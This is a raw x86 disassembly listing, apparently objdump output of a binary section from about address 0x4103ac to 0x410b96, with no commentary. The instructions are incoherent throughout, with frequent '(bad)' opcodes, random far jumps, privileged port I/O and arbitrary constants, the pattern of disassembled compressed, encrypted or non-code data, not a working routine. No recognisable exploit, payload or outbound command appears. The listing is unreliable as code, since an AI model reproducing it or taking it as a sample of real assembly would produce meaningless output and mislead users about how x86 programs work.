  4103ac:	sbb    ch,BYTE PTR [ecx+0x723b8ee6]
  4103b2:	pop    esp
  4103b3:	fidivr WORD PTR [edi-0x488f94ca]
  4103b9:	retf   0x7e16
  4103bc:	pop    edx
  4103bd:	(bad)  
  4103be:	mov    ?,WORD PTR [esi-0x49e2ef81]
  4103c4:	out    0xe8,al
  4103c6:	das    
  4103c7:	(bad)  
  4103c9:	or     eax,0xa641945f
  4103ce:	mov    cl,0x14
  4103d0:	sar    bh,cl
  4103d2:	adc    dh,BYTE PTR [ecx-0x7fe4b8d5]
  4103d8:	lock aad 0xf6
  4103db:	pop    ds
  4103dc:	pop    es
  4103dd:	(bad)  
  4103df:	cs pop eax
  4103e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103e2:	ret    
  4103e3:	js     0x410402
  4103e5:	or     al,al
  4103e7:	arpl   WORD PTR [ecx-0xa5343c9],bp
  4103ed:	jns    0x410394
  4103ef:	lea    edi,[ebx+0x1e]
  4103f2:	push   ds
  4103f3:	imul   esi,DWORD PTR [ecx-0xb],0xffffff9a
  4103f7:	push   edx
  4103f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103f9:	sub    bl,ah
  4103fb:	adc    BYTE PTR [edx],bl
  4103fd:	inc    ebp
  4103fe:	out    0x13,al
  410400:	push   0x50e2f4d
  410405:	pushf  
  410406:	dec    esp
  410407:	es je  0x4103b2
  41040a:	gs mov bh,0xb
  41040d:	pushf  
  41040e:	jecxz  0x410457
  410410:	push   0x1beb0675
  410415:	mul    BYTE PTR [ecx]
  410417:	xor    al,BYTE PTR [edi]
  410419:	ins    DWORD PTR es:[edi],dx
  41041a:	imul   ecx,DWORD PTR [ebp+eiz*2+0x3e78f612],0xc7ed685
  410425:	push   0xffffff91
  410427:	xchg   ebp,eax
  410428:	sub    dh,BYTE PTR [ecx-0x67]
  41042b:	mov    esi,ebx
  41042d:	les    edx,FWORD PTR [esp+eiz*2+0xddba0f1]
  410434:	xor    dh,bh
  410436:	mov    esi,0x5810b1a0
  41043b:	mov    bl,0x94
  41043d:	push   ebx
  41043e:	adc    ch,BYTE PTR [eax+esi*4-0x11]
  410442:	popf   
  410443:	test   DWORD PTR [ebp-0x14666ce7],0xe0b131c2
  41044d:	mov    edx,0x4a18e358
  410452:	push   0x776f8ec3
  410457:	sahf   
  410458:	(bad)  
  410459:	or     dl,BYTE PTR [ebp-0x765f4647]
  41045f:	mov    al,0x93
  410461:	pushf  
  410462:	push   es
  410463:	and    eax,edi
  410465:	xchg   ecx,eax
  410466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410467:	xor    DWORD PTR [ebp+0xb],ebp
  41046a:	and    eax,0xb112afe0
  41046f:	jbe    0x4104b5
  410471:	mov    cl,0xe6
  410473:	outs   dx,BYTE PTR ds:[esi]
  410474:	jnp    0x410476
  410476:	pusha  
  410477:	icebp  
  410478:	inc    edx
  410479:	pusha  
  41047a:	test   eax,0x345371a4
  41047f:	rcr    DWORD PTR [edx+0x40],1
  410482:	mov    al,ds:0x2e543cb3
  410487:	mov    al,0x80
  410489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41048a:	xchg   al,dh
  41048c:	push   edi
  41048d:	mov    eax,ds:0x95dc8b55
  410492:	scas   eax,DWORD PTR es:[edi]
  410493:	pop    esp
  410494:	ins    BYTE PTR es:[edi],dx
  410495:	leave  
  410496:	leave  
  410497:	ret    
  410498:	sbb    ebp,DWORD PTR [ebp+eiz*1+0xf]
  41049c:	das    
  41049d:	or     eax,ecx
  41049f:	jg     0x410427
  4104a1:	pushf  
  4104a2:	lock or BYTE PTR ds:0xce69d481,dl
  4104a9:	push   edx
  4104aa:	sub    ecx,ebx
  4104ac:	lock fstp DWORD PTR [ebp+0x1fc59944]
  4104b3:	or     al,0x63
  4104b5:	test   eax,0xba609926
  4104ba:	adc    eax,0x6115b24f
  4104bf:	dec    edx
  4104c0:	jmp    0x4dc0:0xe06a3635
  4104c7:	mov    eax,ds:0x902a790f
  4104cc:	sbb    eax,0xd09fbd03
  4104d1:	jmp    0x9f66a7df
  4104d6:	shr    DWORD PTR [esp+eiz*8],0xc1
  4104da:	not    ah
  4104dc:	sbb    al,0x58
  4104de:	cwde   
  4104df:	inc    esp
  4104e0:	push   ecx
  4104e1:	pop    eax
  4104e2:	outs   dx,DWORD PTR ds:[esi]
  4104e3:	adc    dl,BYTE PTR [edi+0x58]
  4104e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104e7:	ja     0x4104f4
  4104e9:	pop    ss
  4104ea:	cld    
  4104eb:	sbb    eax,0x26bd76a9
  4104f0:	xlat   BYTE PTR ds:[ebx]
  4104f1:	xchg   ebp,eax
  4104f2:	jnp    0x4104cb
  4104f4:	stc    
  4104f5:	iret   
  4104f6:	fmul   QWORD PTR [esi+esi*1-0xd9bbcd4]
  4104fd:	inc    edx
  4104fe:	and    al,0x76
  410500:	fld    QWORD PTR [ebx]
  410502:	mov    esp,0xb542991a
  410507:	adc    DWORD PTR [ebx+esi*8-0x72fc0750],edi
  41050e:	cmp    edx,DWORD PTR [esi-0x565d9a2b]
  410514:	mov    ebp,0xedbd16fb
  410519:	xchg   esi,eax
  41051a:	inc    eax
  41051b:	cmp    eax,0x2107ec53
  410520:	je     0x410596
  410522:	in     eax,dx
  410523:	rcl    BYTE PTR [eax],1
  410525:	push   es
  410526:	in     eax,dx
  410527:	lea    esp,[eax]
  410529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41052a:	sub    eax,0xb858771d
  41052f:	sbb    dl,bl
  410531:	jecxz  0x4104e1
  410533:	stos   DWORD PTR es:[edi],eax
  410534:	jae    0x4104d4
  410536:	cmp    BYTE PTR [ebx],dl
  410538:	sti    
  410539:	dec    edi
  41053a:	mov    esp,ecx
  41053c:	retf   
  41053d:	les    esi,FWORD PTR [eax+0x2e855d82]
  410543:	(bad)  
  410544:	lea    ecx,[ecx+0x4f]
  410547:	shl    DWORD PTR [edx-0x287b454e],1
  41054d:	in     eax,0xc2
  41054f:	and    al,0xc7
  410551:	add    esi,DWORD PTR [esi-0x4f]
  410554:	cld    
  410555:	sbb    ecx,DWORD PTR [ebx+eax*8]
  410558:	mov    al,0xcd
  41055a:	push   ebx
  41055b:	shl    DWORD PTR [ecx-0x1aae6c7f],cl
  410561:	mov    edi,0x3a1446e
  410566:	test   BYTE PTR ds:0x877bfc96,ch
  41056c:	pop    edi
  41056d:	jg     0x410574
  41056f:	sbb    eax,0xff41a69a
  410574:	pop    ecx
  410575:	test   eax,0xd8f82326
  41057a:	aad    0x10
  41057c:	mov    DWORD PTR [eax-0x32],esp
  41057f:	(bad)  
  410580:	mov    ecx,0xb383b504
  410585:	cmc    
  410586:	xchg   ecx,eax
  410587:	aaa    
  410588:	cmp    DWORD PTR [ecx],ebp
  41058a:	jmp    FWORD PTR [edx-0x6e]
  41058d:	xor    esp,DWORD PTR [ecx]
  41058f:	cmp    BYTE PTR [ebx],dl
  410591:	cdq    
  410592:	(bad)  
  410593:	stos   BYTE PTR es:[di],al
  410595:	neg    bh
  410597:	stos   DWORD PTR es:[edi],eax
  410598:	xlat   BYTE PTR ds:[ebx]
  410599:	jecxz  0x410588
  41059b:	ret    
  41059c:	jge    0x4105a7
  41059e:	mov    esi,0xd824e03d
  4105a3:	(bad)  
  4105a4:	sub    DWORD PTR [esi+0x46],ebx
  4105a7:	popa   
  4105a8:	jno    0x4105e9
  4105aa:	sbb    al,0xb9
  4105ac:	mov    eax,0x7cdbb831
  4105b1:	repz mov dh,0xaf
  4105b4:	pop    eax
  4105b5:	sub    al,0x5f
  4105b7:	cmp    al,0xe6
  4105b9:	add    DWORD PTR [eax-0x4e],ecx
  4105bc:	add    BYTE PTR [esi-0x2c],bh
  4105bf:	jmp    0xf328:0xb38a1660
  4105c6:	neg    al
  4105c8:	push   cs
  4105c9:	fld    QWORD PTR [esi-0x6e54dbe4]
  4105cf:	hlt    
  4105d0:	test   DWORD PTR [eax-0x7f],edi
  4105d3:	(bad)  
  4105d5:	xchg   ebp,eax
  4105d6:	shl    BYTE PTR [ebx+0x3e3a17ed],cl
  4105dc:	xchg   ecx,ebp
  4105de:	or     BYTE PTR cs:[esi+0x65],ah
  4105e2:	mov    ch,BYTE PTR [edx-0x64795776]
  4105e8:	inc    ebx
  4105e9:	adc    dl,BYTE PTR [edi+0x1a18c96]
  4105ef:	je     0x4105d5
  4105f1:	(bad)  
  4105f2:	pop    eax
  4105f3:	bound  ecx,QWORD PTR [eax]
  4105f5:	je     0x41062e
  4105f7:	daa    
  4105f8:	pop    ds
  4105f9:	and    eax,0xb40834c8
  4105fe:	ret    0x8682
  410601:	push   ecx
  410602:	mov    ebp,0x264e344b
  410607:	sbb    BYTE PTR [esi+0x62],bh
  41060a:	mov    eax,0xfbe9648e
  41060f:	push   esi
  410610:	sar    DWORD PTR [esi-0x1c9c35af],1
  410616:	pop    es
  410617:	mov    al,0xaf
  410619:	lea    eax,[esi]
  41061b:	pcmpeqb mm5,QWORD PTR [ecx]
  41061e:	jmp    0x410657
  410620:	mov    dh,cl
  410622:	hlt    
  410623:	push   esi
  410624:	fisttp QWORD PTR [eax-0x271f77db]
  41062a:	call   0x6156488
  41062f:	inc    ebp
  410630:	fstp   TBYTE PTR [ebx-0x77]
  410633:	pushw  ss
  410635:	stc    
  410636:	push   ecx
  410637:	xchg   edx,eax
  410638:	shr    DWORD PTR [edx],1
  41063a:	ret    
  41063b:	stos   BYTE PTR es:[edi],al
  41063c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063e:	adc    bl,BYTE PTR [esi]
  410640:	dec    ecx
  410641:	test   al,0x6c
  410643:	sbb    eax,0x7ee72a9a
  410648:	pusha  
  410649:	mov    dh,0xd5
  41064b:	cdq    
  41064c:	push   esi
  41064d:	iret   
  41064e:	and    eax,DWORD PTR ds:0x513a4e5
  410654:	ss adc eax,0x48fb5737
  41065a:	mov    esi,0x8710bb26
  41065f:	and    dl,dh
  410661:	repz push 0x1f6abb72
  410667:	es sub dh,ch
  41066a:	xchg   ebx,eax
  41066b:	outs   dx,BYTE PTR ds:[esi]
  41066c:	shl    BYTE PTR [ebp-0x77625d03],0x24
  410673:	and    eax,esi
  410675:	sbb    dh,dl
  410677:	(bad)  
  410678:	sub    edx,ebp
  41067a:	ficomp DWORD PTR [eax-0x18]
  41067d:	adc    eax,0x7af82990
  410682:	push   ds
  410683:	xlat   BYTE PTR ds:[ebx]
  410684:	cdq    
  410685:	std    
  410686:	adc    DWORD PTR [edx],eax
  410688:	jg     0x41063e
  41068a:	nop
  41068b:	fs jne 0x41062f
  41068e:	sub    al,0x89
  410690:	adc    BYTE PTR [eax-0x75],ch
  410693:	push   edi
  410694:	pop    ecx
  410695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410696:	cmp    DWORD PTR [edi+0x7f8dad2f],esp
  41069c:	cdq    
  41069d:	retf   
  41069e:	jbe    0x410636
  4106a0:	lods   ax,WORD PTR ds:[esi]
  4106a3:	jmp    0x4106cc
  4106a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a6:	shl    BYTE PTR [ebp+0x6a93006f],cl
  4106ac:	test   eax,0xbd52dfed
  4106b1:	imul   BYTE PTR ds:0xe7184738
  4106b7:	out    0x25,eax
  4106b9:	push   ds
  4106ba:	in     al,dx
  4106bb:	(bad)  [ebx+0x23]
  4106be:	push   es
  4106bf:	stos   DWORD PTR es:[edi],eax
  4106c0:	and    bl,BYTE PTR [esi]
  4106c2:	cmp    edx,0x70
  4106c5:	push   edi
  4106c6:	jne    0x4106d9
  4106c8:	mov    edx,0x24d260aa
  4106cd:	(bad)  
  4106ce:	jmp    0x1dd5:0x204899df
  4106d5:	addr16 cmc 
  4106d7:	daa    
  4106d8:	cmp    al,0xed
  4106da:	mov    eax,ds:0xcd7ade3f
  4106df:	inc    ebp
  4106e0:	stc    
  4106e1:	sub    BYTE PTR [eax],al
  4106e3:	mov    ah,0xe5
  4106e5:	js     0x4106d9
  4106e7:	pop    es
  4106e8:	jmp    DWORD PTR [ecx+0x177aace6]
  4106ee:	mov    ds,WORD PTR [esi+0x7d]
  4106f1:	and    eax,DWORD PTR [ebp+0x5fb14704]
  4106f7:	fdivr  QWORD PTR [edx+0x40]
  4106fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106fb:	sbb    eax,0xa19a3121
  410700:	xor    DWORD PTR [edx+0x150b928e],esi
  410706:	sub    eax,0xfa41bc13
  41070b:	inc    ebx
  41070c:	into   
  41070d:	or     DWORD PTR [ecx+eax*2-0x5],esp
  410711:	sti    
  410712:	int    0x68
  410714:	sahf   
  410715:	fdiv   QWORD PTR [ebp+0x30]
  410718:	dec    edx
  410719:	push   esp
  41071a:	jle    0x41075d
  41071c:	mov    eax,ds:0x2036e1
  410721:	dec    esi
  410722:	ja     0x4106a6
  410724:	xor    eax,0xdb9cd80c
  410729:	push   ecx
  41072a:	stos   BYTE PTR es:[edi],al
  41072b:	mov    edi,0x8721d1fb
  410730:	dec    esp
  410731:	mov    edi,0x3dbb08a
  410736:	dec    esi
  410737:	pop    edx
  410738:	out    0xc4,al
  41073a:	rcl    DWORD PTR [ebp+0x4e],1
  41073d:	test   BYTE PTR [edx+0x4f],ch
  410740:	and    DWORD PTR [ebp+ebx*2+0x67],ecx
  410744:	mov    BYTE PTR ds:0x500d9e81,dh
  41074a:	aad    0xd3
  41074c:	repnz add bl,ch
  41074f:	jnp    0x41072b
  410751:	jmp    0x4aef80b7
  410756:	cli    
  410757:	jns    0x410758
  410759:	pop    ss
  41075a:	push   cs
  41075b:	sbb    al,0xe5
  41075d:	lods   eax,DWORD PTR ds:[esi]
  41075e:	call   FWORD PTR [ecx]
  410760:	imul   BYTE PTR [ecx]
  410762:	mov    esp,0x635c3753
  410767:	fiadd  DWORD PTR [edi]
  410769:	ins    DWORD PTR es:[edi],dx
  41076a:	lds    edi,FWORD PTR [edi]
  41076c:	adc    eax,0x2da4bf96
  410771:	out    0x46,al
  410773:	xchg   ebp,eax
  410774:	mov    ah,0xa6
  410776:	in     eax,dx
  410777:	mov    DWORD PTR [ebp+0x64510ebb],edi
  41077d:	int    0x80
  41077f:	iret   
  410780:	adc    BYTE PTR [esi+0x1f],cl
  410783:	inc    edi
  410784:	and    eax,0x7e598f06
  410789:	arpl   WORD PTR [ecx-0x3438882],sp
  41078f:	loopne 0x4107f8
  410791:	jb     0x41073c
  410793:	xor    ebx,DWORD PTR [esi]
  410795:	cli    
  410796:	mov    ebx,0x5953365f
  41079b:	ins    DWORD PTR es:[edi],dx
  41079c:	test   DWORD PTR [edi],edi
  41079e:	pop    edx
  41079f:	ret    
  4107a0:	mov    BYTE PTR [edx],dl
  4107a2:	or     ecx,DWORD PTR [eax]
  4107a4:	lahf   
  4107a5:	bound  esp,QWORD PTR [edx+0x15de604]
  4107ab:	mov    eax,ds:0x4ab09ca6
  4107b0:	pop    esp
  4107b1:	sub    BYTE PTR [ebp-0x60],ah
  4107b4:	or     ebp,DWORD PTR ss:[ebp+0x71]
  4107b8:	clc    
  4107b9:	jbe    0x410814
  4107bb:	add    DWORD PTR [edx+0x37003855],0xffffffa9
  4107c2:	adc    dl,BYTE PTR [edi+ebx*2]
  4107c5:	jmp    0x410816
  4107c7:	mov    esp,0xe568b660
  4107cc:	fisttp WORD PTR [edx+ebx*8-0xddbf3af]
  4107d3:	popa   
  4107d4:	out    dx,eax
  4107d5:	int3   
  4107d6:	dec    ecx
  4107d7:	xchg   esi,eax
  4107d8:	push   esp
  4107d9:	sub    eax,0x8974a112
  4107de:	mov    bl,0x8c
  4107e0:	nop
  4107e1:	and    BYTE PTR ds:0x39cc55e8,0xa9
  4107e8:	arpl   WORD PTR [ebx-0x6c],ax
  4107eb:	adc    BYTE PTR [edi+0x7ec51348],al
  4107f1:	xchg   esp,eax
  4107f2:	sbb    ch,BYTE PTR [ebx]
  4107f4:	leave  
  4107f5:	fs xchg edi,eax
  4107f7:	and    ebx,DWORD PTR [edx+0x41]
  4107fa:	dec    esi
  4107fb:	in     eax,dx
  4107fc:	sub    esp,ebx
  4107fe:	test   BYTE PTR [esi],0x49
  410801:	jp     0x4107db
  410803:	mov    dh,0x2d
  410805:	cli    
  410806:	pop    DWORD PTR [ecx]
  410808:	in     al,dx
  410809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41080a:	mov    ebp,0xca3e2fbd
  41080f:	stos   BYTE PTR es:[edi],al
  410810:	popf   
  410811:	bound  edi,QWORD PTR [edx-0x2d96abdb]
  410817:	ret    0xdf45
  41081a:	jne    0x410800
  41081c:	scas   eax,DWORD PTR es:[edi]
  41081d:	pop    ebx
  41081e:	mov    cl,BYTE PTR [edx]
  410820:	pop    ebx
  410821:	mov    ds:0x2f9c121,eax
  410826:	sti    
  410827:	add    esi,ecx
  410829:	(bad)  
  41082a:	scas   al,BYTE PTR es:[edi]
  41082b:	sub    al,0xc0
  41082d:	xchg   BYTE PTR [ebx-0x713c0e90],ah
  410833:	popa   
  410834:	dec    ebx
  410835:	shr    BYTE PTR [edx],cl
  410837:	sar    DWORD PTR [eax],0x34
  41083a:	xor    bh,BYTE PTR [ecx+0x1f9b6db4]
  410840:	mov    esp,ecx
  410842:	shl    BYTE PTR [ecx-0x5f],0xf4
  410846:	push   edx
  410847:	aaa    
  410848:	jg     0x410807
  41084a:	and    BYTE PTR [esi],dh
  41084c:	scas   ax,WORD PTR es:[edi]
  41084e:	mov    ebp,0x5c26a723
  410853:	jnp    0x4108cf
  410855:	mov    esp,0x7f9dfa8d
  41085a:	lods   eax,DWORD PTR ds:[esi]
  41085b:	dec    eax
  41085c:	ds cmp al,0xff
  41085f:	(bad)  
  410860:	lods   eax,DWORD PTR ds:[esi]
  410861:	push   0xc5ca90a7
  410866:	retf   
  410867:	int    0xc4
  410869:	push   cs
  41086a:	into   
  41086b:	imul   esp,DWORD PTR [edi],0x2d
  41086e:	mov    eax,ds:0x94380d63
  410873:	jmp    0x5926b74e
  410878:	inc    esp
  410879:	add    al,0xbe
  41087b:	dec    ebx
  41087c:	jmp    0x4b6acac7
  410881:	sbb    edx,esp
  410883:	scas   eax,DWORD PTR es:[edi]
  410884:	pushf  
  410885:	push   0xbb9a89e8
  41088a:	pop    edi
  41088b:	mov    ebp,0x553b2021
  410890:	aam    0x20
  410892:	sbb    DWORD PTR [ebx+0x39],ebx
  410895:	jp     0x41084a
  410897:	xchg   ebp,eax
  410898:	sbb    bl,BYTE PTR ds:0xef2b69df
  41089e:	jl     0x410866
  4108a0:	repnz sbb eax,DWORD PTR [ebx]
  4108a3:	xlat   BYTE PTR ds:[ebx]
  4108a4:	adc    DWORD PTR [edi+0x117a5352],eax
  4108aa:	mov    ecx,0xbdbe9111
  4108af:	add    eax,DWORD PTR [edi+0x66]
  4108b2:	adc    eax,0x472a9faa
  4108b7:	mov    al,0xc7
  4108b9:	mov    ebx,0x4cf4bb48
  4108be:	jo     0x4108ee
  4108c0:	stc    
  4108c1:	fwait
  4108c2:	enter  0xfac7,0xf5
  4108c6:	xlat   BYTE PTR ds:[ebx]
  4108c7:	dec    esi
  4108c8:	or     al,0x3e
  4108ca:	fcomp  QWORD PTR [esi+ebp*1-0x367995d4]
  4108d1:	adc    esi,DWORD PTR [edi+0x58]
  4108d4:	lock add dl,BYTE PTR [edx+0x3a9da8b0]
  4108db:	jb     0x410945
  4108dd:	rol    DWORD PTR [edx],0x9b
  4108e0:	add    eax,0x6d599437
  4108e5:	inc    esi
  4108e6:	and    cl,BYTE PTR [edi-0x63d4e3ce]
  4108ec:	xor    ebp,edi
  4108ee:	scas   eax,DWORD PTR es:[edi]
  4108ef:	fisubr DWORD PTR [ebx-0x4c9c9c75]
  4108f5:	xchg   ebx,eax
  4108f6:	(bad)  
  4108f8:	adc    eax,DWORD PTR [eax+0x19]
  4108fb:	pop    ds
  4108fc:	sar    esp,0xe9
  4108ff:	xchg   esp,eax
  410900:	inc    edi
  410901:	imul   edx,DWORD PTR [ecx-0xba733e0],0x57
  410908:	sbb    ch,BYTE PTR [esi-0x2c0df5d2]
  41090e:	mov    DWORD PTR [esi+0x218b73b9],ebx
  410914:	sahf   
  410915:	(bad)  
  410916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410917:	jmp    0x72a7:0x30565f3d
  41091e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091f:	mov    ebx,0xb959ddb0
  410924:	pop    ss
  410925:	fsubr  QWORD PTR [edx+0x7b81a0d7]
  41092b:	sub    DWORD PTR [esi+0x2],eax
  41092e:	shl    BYTE PTR [edx-0x4f],1
  410931:	push   ebx
  410932:	mov    bl,0x1
  410934:	inc    ebx
  410935:	mov    fs,edx
  410937:	inc    edi
  410938:	icebp  
  410939:	mov    ds:0x178b5d09,al
  41093e:	xchg   ebx,eax
  41093f:	dec    eax
  410940:	in     al,dx
  410941:	std    
  410942:	jae    0x410974
  410944:	xor    eax,0x7d82407b
  410949:	(bad)  
  41094a:	cmp    esp,ecx
  41094c:	lds    ebp,FWORD PTR [esi-0x133b1821]
  410952:	test   BYTE PTR [eax-0xcb57088],cl
  410958:	retf   
  410959:	pusha  
  41095a:	mov    edi,0x2203eff5
  41095f:	mov    es,WORD PTR [ebp-0x31f440ef]
  410965:	shr    DWORD PTR [eax+0x67],1
  410968:	xor    edi,DWORD PTR [ecx+0x25]
  41096b:	retf   
  41096c:	popf   
  41096d:	fst    QWORD PTR ds:[ebp+ecx*4+0x1d]
  410972:	out    dx,eax
  410973:	jb     0x4109bd
  410975:	inc    eax
  410976:	ret    0xeeb
  410979:	mov    edi,0x80b04007
  41097e:	mov    cl,0x17
  410980:	das    
  410981:	mov    ds:0xd4bfcf5a,eax
  410986:	mov    ecx,0x6f1ace89
  41098b:	clc    
  41098c:	fcmovne st,st(1)
  41098f:	sbb    ah,ch
  410991:	adc    ch,BYTE PTR [edi]
  410993:	test   BYTE PTR ds:0xa189214,0xe
  41099a:	jmp    0xbe051d52
  41099f:	(bad)
  4109a2:	es aam 0xdb
  4109a5:	mov    ebp,edi
  4109a7:	int    0xc4
  4109a9:	jae    0x410970
  4109ab:	or     bl,BYTE PTR [edx-0x6f70662c]
  4109b1:	ins    DWORD PTR es:[edi],dx
  4109b2:	adc    ah,BYTE PTR [ebx+eax*4]
  4109b5:	and    bl,ah
  4109b7:	mov    ds:0xd92f9ae0,eax
  4109bc:	(bad)  [ecx+0x5]
  4109bf:	jnp    0x410a1a
  4109c1:	fninit 
  4109c3:	cmp    al,0x2b
  4109c5:	in     eax,0x5b
  4109c7:	push   ebp
  4109c8:	cmp    al,0x65
  4109ca:	ss push 0x8b5a9900
  4109d0:	ror    DWORD PTR [ebx-0x7ca21e5e],cl
  4109d6:	dec    ebx
  4109d7:	shl    DWORD PTR [ebx-0x381cc8db],cl
  4109dd:	popf   
  4109de:	add    edi,DWORD PTR [edi-0x14]
  4109e1:	es jg  0x410a49
  4109e4:	(bad)  
  4109e5:	test   BYTE PTR [ecx],0x13
  4109e8:	jne    0x410a17
  4109ea:	jg     0x410a60
  4109ec:	loopne 0x4109b3
  4109ee:	pop    ebx
  4109ef:	sbb    edi,ecx
  4109f1:	and    DWORD PTR [ebx+0x50],edi
  4109f4:	pop    edi
  4109f5:	pop    ebx
  4109f6:	or     bh,BYTE PTR [esi-0xa3dd994]
  4109fc:	mov    ecx,edi
  4109fe:	fistp  DWORD PTR [ebx-0x5b907362]
  410a04:	loope  0x410a38
  410a06:	imul   esp,ebp,0x59d31d73
  410a0c:	pusha  
  410a0d:	or     DWORD PTR [edx+0x4],esp
  410a10:	test   al,0xd
  410a12:	test   DWORD PTR [ebx+0x2d],ebp
  410a15:	sbb    DWORD PTR [esi-0x469cf285],edx
  410a1b:	push   cs
  410a1c:	cmp    eax,0x14fc97be
  410a21:	int    0xc2
  410a23:	ja     0x410a0c
  410a25:	sub    al,0x10
  410a27:	jmp    0x62a58887
  410a2c:	mov    ebp,0x47c74283
  410a31:	out    dx,al
  410a32:	(bad)  
  410a33:	fadd   DWORD PTR [eax]
  410a35:	call   0x14a043fe
  410a3a:	mov    esi,ebp
  410a3c:	add    ah,BYTE PTR [ecx+0xd220dfe]
  410a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a43:	cld    
  410a44:	jae    0x410a32
  410a46:	jno    0x410a1e
  410a48:	xor    eax,0xec905058
  410a4d:	in     eax,dx
  410a4e:	out    dx,al
  410a4f:	xor    DWORD PTR [edi-0x3d],0xfffffff8
  410a53:	mov    dl,BYTE PTR [eax+0x1b]
  410a56:	jmp    0x3a63:0x9c4e6192
  410a5d:	adc    DWORD PTR [esp+eiz*4+0xb20a2b5],ecx
  410a64:	mov    ebx,0xcb3a287f
  410a69:	sahf   
  410a6a:	mov    cl,0x27
  410a6c:	or     edi,esi
  410a6e:	sbb    BYTE PTR [edx],al
  410a70:	mov    esi,0xc26baef4
  410a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a76:	mov    esi,0xf54e35a9
  410a7b:	icebp  
  410a7c:	sar    BYTE PTR [eax],cl
  410a7e:	in     al,0x64
  410a80:	mov    ch,0xfa
  410a82:	add    esi,DWORD PTR gs:[ebx-0x60ac8168]
  410a89:	fst    QWORD PTR [ecx-0x7d454d6c]
  410a8f:	pop    esi
  410a90:	scas   al,BYTE PTR es:[edi]
  410a91:	xchg   DWORD PTR [ecx],ecx
  410a93:	pop    edx
  410a94:	push   ecx
  410a95:	lea    edx,[ecx-0x80]
  410a98:	ins    BYTE PTR es:[edi],dx
  410a99:	mov    ds:0x688e09dd,al
  410a9e:	pop    edi
  410a9f:	sbb    ebp,ecx
  410aa1:	xor    al,0x50
  410aa3:	add    DWORD PTR ds:0xb65410a7,ebx
  410aa9:	std    
  410aaa:	xchg   bh,cl
  410aac:	pop    edx
  410aad:	bound  esi,QWORD PTR [edi+ebp*4-0x46]
  410ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ab2:	inc    edx
  410ab3:	jmp    0x5b9ae60a
  410ab8:	(bad)  
  410ab9:	pushf  
  410aba:	(bad)  
  410abc:	(bad)  
  410abd:	jnp    0x410a8f
  410abf:	sbb    bl,BYTE PTR [ebp-0x4d]
  410ac2:	dec    ebx
  410ac3:	cmp    al,0x98
  410ac5:	enter  0x8c02,0xb0
  410ac9:	repnz mov ds:0xf8885e9a,eax
  410acf:	sbb    edx,DWORD PTR [eax]
  410ad1:	xor    ecx,ecx
  410ad3:	popf   
  410ad4:	mov    WORD PTR [esi],ss
  410ad6:	jb     0x410ac6
  410ad8:	cwde   
  410ad9:	jae    0x410a7d
  410adb:	mov    WORD PTR [ecx+0x51],?
  410ade:	stos   DWORD PTR es:[edi],eax
  410adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ae0:	into   
  410ae1:	ds (bad) 
  410ae3:	addr16 mov dl,0x13
  410ae6:	stos   BYTE PTR es:[edi],al
  410ae7:	mov    esp,0x23633973
  410aec:	cmp    dl,BYTE PTR [edx]
  410aee:	add    BYTE PTR [ebx-0x7e],0x67
  410af2:	push   esp
  410af3:	ins    DWORD PTR es:[edi],dx
  410af4:	push   cs
  410af5:	and    BYTE PTR [esi+edi*1],ah
  410af8:	mov    cl,0xe3
  410afa:	cdq    
  410afb:	inc    ecx
  410afc:	xchg   edx,eax
  410afd:	and    dl,dl
  410aff:	lds    eax,FWORD PTR [edx+0x5982334e]
  410b05:	push   ss
  410b06:	add    DWORD PTR [edx-0x6b],0xa7fe3773
  410b0d:	pop    di
  410b0f:	adc    eax,0x7bf720a3
  410b14:	or     edi,DWORD PTR [ebx+edi*8-0x34156db]
  410b1b:	repz out 0x77,al
  410b1e:	out    dx,eax
  410b1f:	inc    eax
  410b20:	(bad)  
  410b21:	adc    DWORD PTR [ecx-0x403c43cb],esp
  410b27:	add    dh,al
  410b29:	jl     0x410b27
  410b2b:	pop    ds
  410b2c:	sbb    DWORD PTR [edx-0x22],edx
  410b2f:	sbb    DWORD PTR [esi],ebp
  410b31:	mov    bh,0xb
  410b33:	or     al,0x5f
  410b35:	and    dl,BYTE PTR [eax]
  410b37:	xor    DWORD PTR [esi+0x2942682d],ebx
  410b3d:	push   ebx
  410b3e:	and    al,cl
  410b40:	jo     0x410af4
  410b42:	ret    
  410b43:	imul   ecx,DWORD PTR [edi+esi*4],0xffffffff
  410b47:	adc    bh,BYTE PTR [edi+0x75]
  410b4a:	cwde   
  410b4b:	adc    BYTE PTR [ebx+esi*4+0x7c],dh
  410b4f:	pminsw mm2,QWORD PTR [ebp-0x47e4cad3]
  410b56:	and    ebx,DWORD PTR [eax+edx*1]
  410b59:	adc    ebx,DWORD PTR [eax]
  410b5b:	jae    0x410bb8
  410b5d:	dec    eax
  410b5e:	sbb    al,0x90
  410b60:	push   0xffffffe2
  410b62:	push   0x8d445eec
  410b67:	ins    BYTE PTR es:[edi],dx
  410b68:	mov    bh,0x64
  410b6a:	daa    
  410b6b:	fistp  QWORD PTR [edi+0x25]
  410b6e:	fwait
  410b6f:	shr    BYTE PTR [ebx-0x5c1352a1],cl
  410b75:	(bad)  
  410b76:	and    DWORD PTR [edi+0x5c],esp
  410b79:	fmul   DWORD PTR [edx+ebp*8-0x16b9dc33]
  410b80:	push   ss
  410b81:	mov    eax,0x915299bd
  410b86:	dec    ecx
  410b87:	popf   
  410b88:	imul   esi,DWORD PTR [ebx-0x6b],0x29
  410b8c:	ret    
  410b8d:	js     0x410b79
  410b8f:	ret    
  410b90:	nop
  410b91:	push   0xae671c32
  410b96:	ror    edi,1
